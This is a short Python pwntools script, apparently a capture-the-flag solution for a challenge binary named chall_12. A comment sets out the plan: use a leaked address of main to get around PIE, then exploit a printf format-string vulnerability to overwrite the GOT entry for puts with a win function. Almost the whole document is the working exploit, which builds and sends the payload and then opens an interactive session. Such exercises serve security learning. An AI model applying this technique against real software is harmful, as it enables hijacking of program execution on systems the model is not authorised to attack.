# similar to the previous, exploit a printf vulnerability to overwrite the GOT entry for puts with the win function - except this time, PIE is enabled, so the addresses are randomized. The vulnerable program leaks the address of main, so use that leak to find puts in the GOT as well as the win function.
from pwn import *

elf = ELF("./chall_12")

p = process("./chall_12")

p.recvuntil(b"0x")

main_leak = int(b"0x" + p.recvuntil(b"\n")[0:-1], 16)

offset = 7
elf.address = main_leak - elf.sym.main
overwrite_this = elf.got.puts
win_func = elf.sym.win

payload = fmtstr_payload(offset, {overwrite_this : win_func})

p.sendline(payload)

p.interactive()
